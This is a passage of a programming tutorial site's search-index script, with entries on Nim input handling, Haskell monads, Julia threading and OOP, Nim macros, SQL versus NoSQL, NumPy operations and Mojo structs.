strutils echo \"Please enter your year of birth:\" let yearOfBirth = readLine(stdin).parseInt() let age = 2018 - yearOfBirth echo \"You are \", age, \" years old.\" Convert a string to an integer. When written like this, we trust our user to give a valid integer. What would happen if a user inputs ‘79 or ninety-three? Try it yourself.\nOutput:\nPlease enter your year of birth: Waiting for user input. After entering the year of birth, the program will calculate the age.\nPlease enter your year of birth: 1934 You are 84 years old. If we have a file numbers.txt in the same directory as our Nim code, with the following content:\nnumbers.txt link 27.3 98.24 11.93 33.67 55.01 And we want to read that file and find the sum and average of the numbers provided, we can do something like this:\ninteraction3.nim link import strutils, sequtils, math let strNums = readFile(\"numbers.txt\").strip().splitLines() nums = strNums.map(parseFloat) let sumNums = sum(nums) average = sumNums / float(nums.len) echo sumNums echo average We import multiple modules. strutils gives us strip and splitLines, sequtils gives map, and math gives sum. We strip the final new line, and split lines to create a sequence of strings. map works by applying a procedure (in this case parseFloat) to each member of a container. In other words, we convert each string to a float, returning a new sequence of floats. Using sum from math module to give us the sum of all elements in a sequence. We need to convert the length of a sequence to float because sumNums is a float. Output:\n226.15 45.23 "
            }
        );
    index.add(
            {
                id:  183 ,
                href: "\/tutorials\/docs\/mojo\/",
                title: "Mojo",
                description: "Mojo combines Python's ease of use with advanced programming capabilities. It's tailored for both research and production environments.",
                content: ""
            }
        );
    index.add(
            {
                id:  184 ,
                href: "\/tutorials\/docs\/haskell\/haskell\/monad-magic-in-haskell\/",
                title: "Monad Magic in Haskell",
                description: "Unlock the mystery of monads in Haskell. Learn the fundamental concepts and theories of monads, and explore practical uses with the Maybe, IO, and List Monads.",
                content: "Introduction: linkWelcome to an intriguing exploration of one of Haskell’s most powerful and often mystifying features—monads. Monads play a crucial role in managing side effects and structuring functional programs in Haskell, providing a framework that helps maintain purity while performing IO, handling errors, or iterating over lists. This post will demystify the concept of monads, introduce you to the most commonly used monads like Maybe, IO, and List, and demonstrate how these can be leveraged for effective problem-solving in real-world applications.\nUnderstanding Monads: The Basic Concept and Theory linkThe Monad Concept:\nAt its core, a monad is a design pattern that allows for the composition of functions that produce effects beyond simple computation, in a way that ensures the effects are managed correctly.\nMonad Laws: To qualify as a monad, a type must satisfy three key laws—left identity, right identity, and associativity. These laws ensure that monads behave predictably during operations. Monad Structure: In Haskell, a monad is represented by a type class Monad, which provides two essential operations: \u003e\u003e= (bind): Chains operations while managing the underlying effects. return: Injects a value into the monadic context. -- Monad type class definition class Monad m where return :: a -\u003e m a (\u003e\u003e=) :: m a -\u003e (a -\u003e m b) -\u003e m b The Maybe Monad, IO Monad, and List Monad linkThe Maybe Monad:\nThe Maybe monad encapsulates an optional value. A value can either be Just something or Nothing. It is particularly useful for functions that might fail to return a value.\nsafeDivide :: Int -\u003e Int -\u003e Maybe Int safeDivide _ 0 = Nothing safeDivide x y = Just (x `div` y) -- Using Maybe Monad to handle potential failure result = Just 10 \u003e\u003e= safeDivide 2 The IO Monad:\nThe IO monad encapsulates effects that deal with input/output operations, allowing Haskell to remain pure while interacting with the outside world.\ngetLine :: IO String -- Reads a line from standard input putStrLn :: String -\u003e IO () -- Prints a string to standard output -- A simple IO Monad usage echo :: IO () echo = getLine \u003e\u003e= putStrLn The List Monad:\nThe List monad represents computations that might return multiple results, through the mechanism of list comprehensions.\npowersOfTwo :: Int -\u003e [Int] powersOfTwo n = [1..n] \u003e\u003e= (\\x -\u003e return (2^x)) Using Monads for Practical Problem-Solving linkSolving Real-World Problems with Monads:\nMonads can be incredibly powerful in managing complexity in real-world applications, allowing you to write clean, modular, and robust code.\nError Handling with Maybe Monad: Handling operations that might fail, like parsing data or performing calculations where errors need graceful handling.\nManaging Side Effects with IO Monad: Building applications that require user interaction, file IO, or network communication, ensuring effects are handled predictably.\nIterating with List Monad: Generating complex list transformations and filters, or handling multiple potential computation paths.\nConclusion:\nMonads are a cornerstone of functional programming in Haskell, providing essential structures for handling effects, errors, and multiple outcomes in a clean and predictable way. By understanding and utilizing monads, you can elevate your Haskell programming to handle complex tasks with elegance and power. Explore these concepts, experiment with different monads, and discover how they can simplify your approach to problem-solving in functional programming.\nFrequently Asked Questions:\nQ: How can I practice working with monads? A: Try to refactor existing Haskell code that uses pattern matching and error handling to use monads instead. This practice can help solidify your understanding and highlight the benefits of monadic structures.\nQ: Are there other monads beyond Maybe, IO, and List? A: Yes, Haskell has several other monads like Reader, Writer, and State, each designed to handle specific types of computations and side effects effectively.\n"
            }
        );
    index.add(
            {
                id:  185 ,
                href: "\/tutorials\/docs\/julia\/julia\/multi-thread\/",
                title: "Multi-Thread Programming with Julia",
                description: "Julia, a high-level, high-performance programming language, is designed for technical computing",
                content: "Starting Julia with Multiple Threads linkBy default, Julia starts with a single thread of execution. This can be verified with the command Threads.nthreads():\njulia\u003e Threads.nthreads() 1 The number of execution threads is controlled either by using the -t/--threads command line argument or by setting the JULIA_NUM_THREADS environment variable. If both are specified, -t/--threads takes precedence.\nYou can specify the number of threads either as an integer (--threads=4) or as auto (--threads=auto), where auto tries to infer a useful default number of threads (see Command-line Options for more details).\nJulia 1.5: The -t/--threads command line argument requires at least Julia 1.5. In older versions, you must use the environment variable.\nJulia 1.7: Using auto as the value of the environment variable JULIA_NUM_THREADS requires at least Julia 1.7. In older versions, this value is ignored.\nTo start Julia with 4 threads:\n$ julia --threads 4 Verify there are 4 threads available:\njulia\u003e Threads.nthreads() 4 Currently, you are on the master thread. To check:\njulia\u003e Threads.threadid() 1 If you prefer to use the environment variable, set it as follows:\nBash (Linux/macOS): export JULIA_NUM_THREADS=4 C shell on Linux/macOS, CMD on Windows: set JULIA_NUM_THREADS=4 Powershell on Windows: $env:JULIA_NUM_THREADS=4 This must be done before starting Julia.\nThe number of threads specified with -t/--threads is propagated to worker processes spawned using the -p/--procs or --machine-file command line options. For example, julia -p2 -t2 spawns 1 main process with 2 worker processes, all having 2 threads enabled. For more control over worker threads, use addprocs and pass -t/--threads as exeflags.\nMultiple GC Threads linkThe Garbage Collector (GC) can use multiple threads. The number used is either half the number of compute worker threads or is configured by the --gcthreads command line argument or by the JULIA_NUM_GC_THREADS environment variable.\nJulia 1.10: The --gcthreads command line argument requires at least Julia 1.10.\nThreadpools linkWhen a program’s threads are busy with many tasks, tasks may experience delays, affecting the program’s responsiveness. To address this, you can specify a task as interactive when you use Threads.@spawn:\nusing Base.Threads @spawn :interactive f() Interactive tasks should avoid high-latency operations and, if long-running, should yield frequently.\nJulia can be started with one or more threads reserved for interactive tasks:\n$ julia --threads 3,1 Similarly, using the environment variable:\nexport JULIA_NUM_THREADS=3,1 This starts Julia with 3 threads in the :default threadpool and 1 thread in the :interactive threadpool:\njulia\u003e using Base.Threads julia\u003e nthreadpools() 2 julia\u003e threadpool() # the main thread is in the interactive thread pool :interactive julia\u003e nthreads(:default) 3 julia\u003e nthreads(:interactive) 1 julia\u003e nthreads() 3 The zero-argument version of nthreads returns the number of threads in the default pool. Depending on whether Julia has been started with interactive threads, the main thread is either in the default or interactive thread pool.\nEither or both numbers can be replaced with the word auto, which causes Julia to choose a reasonable default.\nCommunication and Synchronization linkAlthough Julia’s threads can communicate through shared memory, writing correct and data-race-free multi-threaded code is challenging. Julia’s Channels are thread-safe and may be used to communicate safely.\nData-Race Freedom: It is your responsibility to ensure your program is data-race free. Using locks around any access to data shared between multiple threads is essential. For example:\njulia\u003e lock(lk) do use(a) end julia\u003e begin lock(lk) try use(a) finally unlock(lk) end end Where lk is a lock (e.g., ReentrantLock()) and a is data.\nJulia is not memory safe in the presence of a data race. Be careful about reading data if another thread might write to it! Always use the lock pattern when changing data accessed by other threads.\nThe @threads Macro linkLet’s use native threads in a simple example. Create an array of zeros:\njulia\u003e a = zeros(10) 10-element Vector{Float64}: 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 0.0 Operate on this array simultaneously using 4 threads, with each thread writing its thread ID into each location. The Threads.@threads macro indicates that the loop is a multi-threaded region:\njulia\u003e Threads.@threads for i = 1:10 a[i] = Threads.threadid() end The iteration space is split among the threads, each writing its thread ID to its assigned locations:\njulia\u003e a 10-element Vector{Float64}: 1.0 1.0 1.0 2.0 2.0 2.0 3.0 3.0 4.0 4.0 Note that Threads.@threads does not have an optional reduction parameter like @distributed.\nUsing @threads Without Data Races linkConsider a naive sum function:\njulia\u003e function sum_single(a) s = 0 for i in a s += i end s end sum_single (generic function with 1 method) julia\u003e sum_single(1:1_000_000) 500000500000 Simply adding @threads exposes a data race with multiple threads reading and writing s at the same time:\njulia\u003e function sum_multi_bad(a) s = 0 Threads.@threads for i in a s += i end s end sum_multi_bad (generic function with 1 method) julia\u003e sum_multi_bad(1:1_000_000) 70140554652 The result is incorrect and changes with each evaluation.\nTo fix this, use buffers specific to each task to segment the sum into chunks that are race-free. Reuse sum_single, which has its own internal buffer s, and split vector a into nthreads() chunks for parallel work via nthreads() @spawn-ed tasks:\njulia\u003e function sum_multi_good(a) chunks = Iterators.partition(a, length(a) ÷ Threads.nthreads()) tasks = map(chunks) do chunk Threads.@spawn sum_single(chunk) end chunk_sums = fetch.(tasks) return sum_single(chunk_sums) end sum_multi_good (generic function with 1 method) julia\u003e sum_multi_good(1:1_000_000) 500000500000 Buffers should not be managed based on threadid(), as tasks can yield and use the same buffer on a given thread, introducing data race risks. Task migration means tasks may change threads at yield points.\nAlternatively, use atomic operations on variables shared across tasks/threads, which may be more performant depending on the operation’s characteristics.\nAtomic Operations linkJulia supports accessing and modifying values atomically, avoiding race conditions. A value (which must be a primitive type) can be wrapped as Threads.Atomic to indicate thread-safe access. Here’s an example:\njulia\u003e i = Threads.Atomic{Int}(0); julia\u003e ids = zeros(4); julia\u003e old_is = zeros(4); julia\u003e Threads.@threads for id in 1:4 old_is[id] = Threads.atomic_add!(i, id) ids[id] = id end julia\u003e old_is 4-element Vector{Float64}: 0.0 1.0 7.0 3.0 julia\u003e i[] 10 julia\u003e ids 4-element Vector{Float64}: 1.0 2.0 3.0 4.0 Without the atomic tag, a race condition might produce incorrect results:\njulia\u003e using Base.Threads julia\u003e Threads.nthreads() 4 julia\u003e acc = Ref(0) Base.RefValue{Int64}(0) julia\u003e @threads for i = 1:1000 acc[] += 1 end julia\u003e acc Base.RefValue{Int64}(955) Use Threads.atomic_add! to avoid this:\njulia\u003e acc = Atomic{Int64}(0) Base.Threads.Atomic{Int64}(0) julia\u003e @threads for i = 1:1000 Threads.atomic_add!(acc, 1) end julia\u003e acc Base.Threads.Atomic{Int64}(1000) This ensures acc is properly incremented to 1000.\nTasks (aka Coroutines) linkTasks support concurrent operations, useful when tasks depend on IO and avoid simultaneous processing.\nUse @async to create tasks:\njulia\u003e t = @async 1 + 1 Task (runnable) @0x00007f9a104ca550 julia\u003e fetch(t) 2 julia\u003e t = @async begin sleep(0.5) 1 + 1 end Task (runnable) @0x00007f9a14d0dcd0 julia\u003e fetch(t) 2 @async\nThis macro is syntactic sugar for a Task constructor followed by schedule:\njulia\u003e t = Task(() -\u003e begin sleep(0.5) 1 + 1 end) Task (runnable) @0x00007f9a14d66ed0 julia\u003e schedule(t) Task (runnable) @0x00007f9a14d66ed0 julia\u003e fetch(t) 2 Use schedule to return the task for chaining with other functions:\njulia\u003e fetch(schedule(Task(() -\u003e (sleep(0.5); 1 + 1)))) 2 @async schedules and returns the task:\njulia\u003e fetch(@async (sleep(0.5); 1 + 1)) 2 Channels\nChannels communicate data between tasks. The simplest form:\njulia\u003e channel = Channel{Int}(10); julia\u003e produce(channel) = for i in 1:20 put!(channel, i) end; julia\u003e c = @async produce(channel); julia\u003e while isopen(channel) println(take!(channel)) end Channel Creation\nChannel{T}(sz): Creates a channel of type T and size sz.\nWithout specifying a buffer size, an unbuffered channel is created:\njulia\u003e c = Channel{Int}(0) Channel{Int64}(sz_max:0,sz_curr:0) julia\u003e @async put!(c, 1) julia\u003e take!(c) 1 Task blocking occurs when performing actions on unbuffered channels without available counterparts. The Channel constructor can take a function to execute:\njulia\u003e c = Channel(32) do c for n = 1:32 put!(c, n) end end; julia\u003e for x in c println(x) end Remote Channels\nRemote channels enable remote storage and retrieval of values, utilizing remote workers for parallel computations.\nTo use a remote channel, start Julia with multiple worker processes using -p or --machine-file:\njulia -p n In the REPL, manage remote channels:\njulia\u003e addprocs(2) 2-element Vector{Int64}: 2 3 julia\u003e @everywhere foo() = 1 julia\u003e @spawnat :any foo() Future(2, 1, 4, nothing) julia\u003e fetch(@spawnat :any foo()) 1 Remote channels provide remote communication through an API similar to local channels. They can be created on specific or remote workers:\njulia\u003e r = RemoteChannel(()-\u003eChannel{Int}(10), 2) RemoteChannel{Channel{Int64}}(2, 1, 7) julia\u003e @async begin for i in 1:10 put!(r, i) end end; julia\u003e fetch(@spawnat 2 take!(r)) 1 In this example, the remote channel r is created on worker 2 with a buffer size of 10, and values are asynchronously placed and fetched.\nExplore these threading and task capabilities to harness the full power of Julia’s concurrency model for efficient, parallelized applications.\n"
            }
        );
    index.add(
            {
                id:  186 ,
                href: "\/tutorials\/docs\/nim\/",
                title: "Nim",
                description: "Nim is a relatively new programming language which allows users to write easy-to-read high-performance code.",
                content: ""
            }
        );
    index.add(
            {
                id:  187 ,
                href: "\/tutorials\/docs\/nim\/nim\/nims_marco_system\/",
                title: "Nim Macros: A Comprehensive Tutorial",
                description: "Nim Lang description",
                content: "Macros in Nim are powerful tools that allow you to transform Nim’s abstract syntax tree (AST) at compile-time. This tutorial will guide you through the essential concepts and practical applications of Nim’s macro system.\nWhat is a Macro? linkA macro in Nim is a function that executes at compile-time, transforming a Nim syntax tree into a different tree. This capability can be leveraged for various tasks, such as:\nEnhanced Assertions: Implement an assert macro that prints both sides of a comparison if the assertion fails. Debugging: Create a debug macro that prints the value and name of a symbol. Symbolic Differentiation: Automatically perform differentiation on mathematical expressions. Example Implementations link Assertion Macro:\nmacro myAssert(arg: untyped): untyped = arg.expectKind nnkInfix arg.expectLen 3 let op = newLit(\" \" \u0026 arg[0].repr \u0026 \" \") let lhs = arg[1] let rhs = arg[2] result = quote do: if not `arg`: raise newException(AssertionDefect, $`lhs` \u0026 `op` \u0026 $`rhs`) let a = 1 let b = 2 myAssert(a != b) myAssert(a == b) Debug Macro:\nmacro myDebugEcho(arg: untyped): untyped = result = quote do: echo `arg.repr`, \": \", `arg` let x = 42 myDebugEcho(x) Symbolic Differentiation:\nimport macros macro diff(expr: untyped, var: untyped): untyped = # Implementation of symbolic differentiation goes here # This example is a placeholder result = quote do: echo \"Differentiation logic\" let a = 2 let b = 3 diff(a * b, a) Macro Arguments linkMacro arguments can be typed or untyped, each with its advantages and limitations.\nUntyped Arguments: Passed before semantic checks, leading to simpler syntax trees but less flexibility with Nim’s overload resolution. Typed Arguments: Passed after semantic checks, offering more complex trees with type information. Static Arguments linkStatic arguments pass values directly to the macro, not as syntax trees.\nimport std/macros macro myMacro(arg: static[int]): untyped = echo arg # Outputs the integer value directly myMacro(1 + 2 * 3) # Outputs: 7 Code Blocks as Arguments linkYou can pass complex syntax trees to macros using indented code blocks.\necho \"Hello \": let a = \"Wor\" let b = \"ld!\" a \u0026 b This feature is particularly useful for macros, allowing the passage of complex trees.\nUnderstanding the Syntax Tree linkTo build and manipulate Nim’s syntax tree, it’s crucial to understand how Nim source code is represented. The macros.treeRepr function is invaluable for this, as it converts a syntax tree into a readable string.\nimport macros dumpTree: var mt: MyType = MyType(a:123.456, b:\"abcdef\") # Output example: # StmtList # VarSection # IdentDefs # Ident \"mt\" # Ident \"MyType\" # ObjConstr # Ident \"MyType\" # ExprColonExpr # Ident \"a\" # FloatLit 123.456 # ExprColonExpr # Ident \"b\" # StrLit \"abcdef\" Custom Semantic Checking linkBefore transforming the syntax tree, macros should verify the form of their arguments.\nmacro myAssert(arg: untyped): untyped = arg.expectKind nnkInfix arg.expectLen 3 # Further processing... Generating Code linkYou can generate code in two ways:\nUsing newTree and newLit:\nimport std/macros let tree = newTree(nnkStmtList, newLit(42)) Using quote do:\nimport std/macros macro a(i) = quote do: let `i` = 0 a b doAssert b == 0 Building Your First Macro linkTo create a macro like myAssert, start with a simple example and print the argument to understand its structure.\nimport std/macros macro myAssert(arg: untyped): untyped = echo arg.treeRepr let a = 1 let b = 2 myAssert(a != b) Power and Responsibility linkMacros are powerful and should be used judiciously. Prefer templates or generics when possible, and ensure macros are well-documented to maintain code clarity.\nLimitations linkMacros share the limitations of the NimVM, such as the inability to call non-compiler C functions directly.\nBy understanding these core concepts and techniques, you can harness the full power of Nim’s macro system to write more expressive and efficient code.\n"
            }
        );
    index.add(
            {
                id:  188 ,
                href: "\/tutorials\/docs\/system-design\/system-design\/nosql_vs_sql\/",
                title: "NoSQL vs. SQL Databases: A Comprehensive Overview",
                description: "If you are looking to grow in you tech career and understand system design indepth, this guide is for you.",
                content: "TL;DR linkNoSQL databases, developed in the late 2000s, focus on scalability, fast queries, ease of application changes, and simpler programming for developers. In contrast, SQL databases, originating in the 1970s, aim to reduce data duplication and typically require expensive vertical scaling. SQL databases have rigid, complex schemas, while NoSQL databases offer flexible, schema-less structures.\nIf you’re not familiar with NoSQL databases or the different types, start here.\nOverview linkThis article covers:\nDifferences between SQL and NoSQL databases Benefits of NoSQL databases Drawbacks of NoSQL databases How to try a NoSQL database Differences Between SQL and NoSQL linkThe table below summarizes the main differences between SQL and NoSQL databases.\nAspect SQL Databases NoSQL Databases Data Storage Model Tables with fixed rows and columns Document: JSON documents, Key-value: key-value pairs, Wide-column: tables with dynamic columns, Graph: nodes and edges Development History Developed in the 1970s to reduce data duplication Developed in the late 2000s for scalability and rapid application changes driven by agile and DevOps practices Examples Oracle, MySQL, Microsoft SQL Server, PostgreSQL Document: MongoDB, CouchDB; Key-value: Redis, DynamoDB; Wide-column: Cassandra, HBase; Graph: Neo4j, Amazon Neptune Primary Purpose General purpose Varies: general purpose, large data with simple queries, predictable query patterns, analyzing relationships Schemas Rigid Flexible Scaling Vertical (scale-up) Horizontal (scale-out) Multi-Record ACID Transactions Supported Mostly unsupported, some like MongoDB support them Joins Typically required Typically not required Data to Object Mapping Requires ORM (Object-Relational Mapping) Often not required, e.g., MongoDB documents map directly to programming language data structures Benefits of NoSQL Databases linkFlexible Data Models linkNoSQL databases offer flexible schemas, allowing for easy modifications as requirements evolve. This flexibility facilitates rapid iteration and continuous integration of new application features.\nHorizontal Scaling linkUnlike SQL databases that often require vertical scaling (migrating to a larger, more expensive server), NoSQL databases allow horizontal scaling. This involves adding more commodity servers to handle increased load.\nFast Queries linkNoSQL databases often provide faster query performance because data is stored in a way that optimizes queries. Unlike SQL databases, which often require joins across normalized tables, NoSQL databases store related data together, reducing the need for joins and speeding up queries.\nDeveloper-Friendly linkSome NoSQL databases, like MongoDB, map their data structures directly to popular programming languages. This mapping simplifies development by allowing developers to work with data in a more intuitive way, reducing code complexity and potential bugs.\nDrawbacks of NoSQL Databases linkLack of Multi-Document ACID Transactions linkMany NoSQL databases do not support ACID (Atomicity, Consistency, Isolation, Durability) transactions across multiple documents. While single-record atomicity is sufficient for many applications, some require ACID transactions across multiple records. MongoDB has addressed this with multi-document ACID transactions in its 4.0 release, further enhanced in 4.2 for sharded clusters.\nLarger Data Footprint linkNoSQL databases, optimized for query performance rather than minimizing data duplication, can require more storage space than SQL databases. While storage costs are relatively low, some NoSQL databases support compression to mitigate this drawback.\nUse Case Specificity linkDifferent types of NoSQL databases are tailored to specific use cases. For example, graph databases excel at analyzing data relationships but may not be ideal for general data retrieval. Selecting the appropriate NoSQL database depends on the specific use cases and requirements.\nHow to Try a NoSQL Database linkMongoDB linkTo explore NoSQL databases, MongoDB is a great starting point. You can read the Where to Use MongoDB white paper to determine if MongoDB or another database suits your needs. Then, learn about the document model in the What Is a Document Database? guide.\nMongoDB Atlas linkFor hands-on experience, use MongoDB Atlas, a fully managed global database service available on all leading cloud providers. Atlas offers a free tier, enabling you to create and experiment with databases without a credit card.\nMongoDB University linkFor structured learning, MongoDB University provides free online training, guiding you step-by-step through MongoDB.\nQuick Start Tutorials linkOnce ready to interact with MongoDB using your preferred programming language, check out the Quick Start Tutorials. These tutorials will help you get up and running quickly.\nBy understanding and leveraging the benefits of NoSQL databases, you can build scalable, efficient, and developer-friendly applications.\n"
            }
        );
    index.add(
            {
                id:  189 ,
                href: "\/tutorials\/docs\/numpy\/",
                title: "numpy",
                description: "NumPy, short for Numerical Python, is a fundamental package for scientific computing in Python. It provides support for large multidimensional arrays and matrices, along with a collection of mathematical functions to operate on these arrays. NumPy is the foundation upon which many other scientific Python libraries are built, making it an essential tool for data manipulation, numerical computing, and machine learning.",
                content: ""
            }
        );
    index.add(
            {
                id:  190 ,
                href: "\/tutorials\/docs\/numpy\/numpy\/broadcasting\/",
                title: "NumPy Broadcasting",
                description: "...",
                content: "NumPy broadcasting is a powerful mechanism that allows arrays of different shapes to be combined in arithmetic operations. Broadcasting enables NumPy to perform element-wise operations on arrays with different shapes, making code more concise and efficient.\nBroadcasting Rules linkNumPy follows a set of rules to determine how arrays with different shapes should be broadcasted:\nDimensions Compatibility: Arrays must have the same number of dimensions, or one of them must have fewer dimensions than the other. Size Compatibility: For each dimension, the size of one array must either match the size of the other array’s dimension or be 1. Broadcasting: If the sizes of the arrays’ dimensions do not match, NumPy will broadcast the dimension with size 1 to match the size of the corresponding dimension in the other array. Example link import numpy as np # Create arrays arr1 = np.array([[1, 2, 3], [4, 5, 6]]) # Shape: (2, 3) arr2 = np.array([10, 20, 30]) # Shape: (3,) # Broadcast arr2 to match the shape of arr1 result = arr1 + arr2 print(\"Result of broadcasting:\") print(result) In this example, arr2 is broadcasted along the second dimension to match the shape of arr1, resulting in:\n[[11 22 33] [14 25 36]] Broadcasting in Action linkBroadcasting allows for concise and efficient code when performing arithmetic operations, making code more readable and reducing the need for explicit looping.\nimport numpy as np # Create arrays arr1 = np.array([[1, 2, 3], [4, 5, 6]]) # Shape: (2, 3) scalar = 10 # Scalar value # Broadcast scalar to match the shape of arr1 result = arr1 * scalar print(\"Result of broadcasting a scalar:\") print(result) In this example, the scalar value 10 is broadcasted to match the shape of arr1, resulting in each element of arr1 being multiplied by 10.\nConclusion linkNumPy broadcasting is a powerful feature that simplifies array operations by automatically aligning arrays with different shapes. By following broadcasting rules, NumPy can efficiently perform element-wise operations, reducing the need for explicit looping and making code more concise and readable. Understanding how broadcasting works is essential for writing efficient and expressive NumPy code in scientific computing, data analysis, and machine learning applications.\nFor more information, refer to the NumPy documentation.\nFeel free to adjust or expand upon this introduction to NumPy broadcasting as needed! Let me know if there’s anything else you’d like to cover.\n"
            }
        );
    index.add(
            {
                id:  191 ,
                href: "\/tutorials\/docs\/numpy\/numpy\/numpy_operations\/",
                title: "NumPy Operations",
                description: "...",
                content: "Overview linkNumPy provides a wide range of mathematical and array operations that enable efficient manipulation and analysis of data. These operations include arithmetic, statistical, logical, aggregation, element-wise comparison, sorting, concatenation, splitting, broadcasting, vectorization, and Fourier transforms, among others. Understanding and leveraging these operations is essential for working effectively with NumPy arrays.\nArithmetic Operations linkNumPy supports standard arithmetic operations such as addition, subtraction, multiplication, and division, both element-wise and matrix-wise. These operations can be performed using NumPy’s array broadcasting and ufuncs.\nimport numpy as np # Create arrays arr1 = np.array([1, 2, 3, 4]) arr2 = np.array([5, 6, 7, 8]) # Element-wise addition result_add = arr1 + arr2 # Element-wise multiplication result_mult = arr1 * arr2 print(\"Element-wise addition:\", result_add) print(\"Element-wise multiplication:\", result_mult) Statistical Operations linkNumPy provides functions for calculating various statistical measures, such as mean, median, standard deviation, variance, and percentile.\nimport numpy as np # Create array data = np.array([1, 2, 3, 4, 5, 6, 7, 8, 9, 10]) # Calculate mean mean = np.mean(data) # Calculate standard deviation std_dev = np.std(data) print(\"Mean:\", mean) print(\"Standard deviation:\", std_dev) Logical Operations linkNumPy supports logical operations such as AND, OR, NOT, and XOR on boolean arrays. These operations are useful for filtering data based on conditions.\nimport numpy as np # Create boolean arrays arr1 = np.array([True, False, True, False]) arr2 = np.array([False, False, True, True]) # Logical AND result_and = np.logical_and(arr1, arr2) # Logical OR result_or = np.logical_or(arr1, arr2) print(\"Logical AND:\", result_and) print(\"Logical OR:\", result_or) Aggregation Operations linkNumPy provides functions for aggregating data along specified axes, such as sum, mean, min, max, and cumulative sum.\nimport numpy as np # Create 2D array arr = np.array([[1, 2, 3], [4, 5, 6]]) # Sum along rows row_sum = np.sum(arr, axis=1) # Mean along columns col_mean = np.mean(arr, axis=0) print(\"Sum along rows:\", row_sum) print(\"Mean along columns:\", col_mean) Additional Useful NumPy Operations link1. Element-wise Comparison linkNumPy provides functions for element-wise comparison between arrays, such as np.equal, np.not_equal, np.greater, np.less, np.greater_equal, and np.less_equal.\nimport numpy as np # Create arrays arr1 = np.array([1, 2, 3, 4]) arr2 = np.array([3, 2, 1, 4]) # Element-wise comparison equal_arr = np.equal(arr1, arr2) greater_arr = np.greater(arr1, arr2) print(\"Equal:\", equal_arr) print(\"Greater than:\", greater_arr) 2. Sorting linkNumPy allows sorting arrays along specified axes using functions like np.sort and np.argsort.\nimport numpy as np # Create array arr = np.array([3, 1, 2, 4]) # Sort array sorted_arr = np.sort(arr) print(\"Sorted array:\", sorted_arr) 3. Concatenation and Splitting linkNumPy provides functions for concatenating and splitting arrays, such as np.concatenate, np.vstack, np.hstack, np.split, and np.vsplit.\nimport numpy as np # Create arrays arr1 = np.array([[1, 2], [3, 4]]) arr2 = np.array([[5, 6], [7, 8]]) # Concatenate arrays vertically concatenated_arr_v = np.vstack((arr1, arr2)) print(\"Concatenated array (vertical):\", concatenated_arr_v) 4. Broadcasting linkBroadcasting is a powerful mechanism in NumPy that enables arithmetic operations between arrays of different shapes.\nimport numpy as np # Create arrays arr1 = np.array([[1, 2, 3], [4, 5, 6]]) scalar = 10 # Broadcasting scalar with array result = arr1 + scalar print(\"Result of broadcasting:\", result) 5. Vectorization linkNumPy encourages vectorized operations, which are faster than traditional looping constructs.\nimport numpy as np # Create arrays arr1 = np.array([1, 2, 3, 4]) arr2 = np.array([5, 6, 7, 8]) # Vectorized operation result = arr1 * arr2 print(\"Result of vectorized operation:\", result) 6. Fourier Transforms linkNumPy provides functions for computing Fourier transforms and inverse Fourier transforms.\nimport numpy as np # Create array arr = np.array([1, 2, 3, 4]) # Compute Fourier transform fourier_transform = np.fft.fft(arr) print(\"Fourier transform:\", fourier_transform) These additional operations expand the capabilities of NumPy and are commonly used in scientific computing, data analysis, and machine learning tasks.\nConclusion linkNumPy offers a vast array of operations for manipulating and analyzing data efficiently. By leveraging these operations, users can perform a wide range of tasks in scientific computing, data analysis, and machine learning. Understanding and mastering NumPy operations is essential for effectively utilizing the library’s capabilities and achieving optimal performance in computational tasks.\n"
            }
        );
    index.add(
            {
                id:  192 ,
                href: "\/tutorials\/docs\/julia\/julia\/object_oriented_programming\/",
                title: "Object Oriented Programming with Julia",
                description: "Julia, a high-level, high-performance programming language, is designed for technical computing",
                content: "Object-Oriented Programming in Julia linkUnderstanding Types and Methods linkJulia, while not an object-oriented language in the traditional sense, supports composite types (similar to classes in other languages) and methods.\nTypes: Used to define a new data structure. Methods: Functions specialized for certain types. Example of defining a type:\nstruct Person name::String age::Int end Structs and Classes linkIn Julia, struct is used to create a composite type. It’s similar to a class in other languages but is immutable by default. To create a mutable type, use mutable struct.\nExample of a mutable struct:\nmutable struct Car make::String model::String year::Int end Inheritance and Polymorphism linkWhile Julia does not support classical inheritance, it allows polymorphism through multiple dispatch. This means functions can be defined for specific types, and Julia chooses the appropriate function based on the types of all arguments.\nExample of polymorphism with multiple dispatch:\n# General greet function greet(person::Person) = println(\"Hello, \", person.name) # Specialized greet for children greet(child::Child) = println(\"Hey, \", child.name, \"!\") struct Child name::String age::Int end # Usage alice = Person(\"Alice\", 30) bob = Child(\"Bob\", 5) greet(alice) # \"Hello, Alice\" greet(bob) # \"Hey, Bob!\" Code Example: Implementing a Simple Class Structure linkLet’s create a simple mutable struct and functions to demonstrate a class-like structure in Julia:\nmutable struct Book title::String author::String pages::Int end # Function to create a new book function create_book(title, author, pages) return Book(title, author, pages) end # Function to display book information function show_book(book::Book) println(\"Book: \", book.title) println(\"Author: \", book.author) println(\"Pages: \", book.pages) end # Creating and displaying a book my_book = create_book(\"Kanye The GOAT\", \"Kanye\", 300) show_book(my_book) This section provides a basic understanding of how to work with composite types and methods in Julia, mimicking an object-oriented style.\n"
            }
        );
    index.add(
            {
                id:  193 ,
                href: "\/tutorials\/docs\/mojo\/mojo\/oop\/",
                title: "Object-Oriented Programming (OOP) Concepts in Mojo",
                description: "Mojo Lang description",
                content: "Current State of OOP in Mojo link As of now, Mojo is still developing its OOP capabilities. This means that traditional OOP concepts, as seen in languages like Python, are not fully implemented in Mojo. However, Mojo does offer a way to create high-level abstractions similar to objects through structures, also known as structs. Structures (Structs) in Mojo link Structs in Mojo are similar to classes in Python in terms of their functionality. They support methods, fields, operator overloading, and decorators for meta-programming. However, structs in Mojo are statically bound at compile-time. This means they do not allow for dynamic dispatch or runtime changes to the structure, unlike Python classes. Example of a Struct in Mojo: link struct MyPair: var first: Int var second: Int fn __init__(inout self, first: Int, second: Int): self.first = first self.second = second fn dump(self): print(self.first, self.second) Instantiating and Using Structs link You can create instances of structs and use their methods. The self argument in Mojo is similar to Python’s self and is used to refer to the current instance of the struct. Creating and Using an Instance of MyPair: link let mine = MyPair(2, 4) mine.dump() // This will print: 2 4 Key Points to Remember link Initialization: The __init__ method in Mojo structs works similarly to constructors in OOP languages. Method Invocation: When calling methods like dump(), the self argument is implicitly passed as the current instance. Static Nature: Mojo structs are static, meaning their structure is fixed at compile time and cannot be altered during runtime. Future Development: Mojo plans to support classes in future releases, which may introduce more dynamic OOP features. "
            }
        );
    index.add(
            {
                id:  194 ,
                href: "\/tutorials\/docs\/nim\/nim\/nims_oop\/",
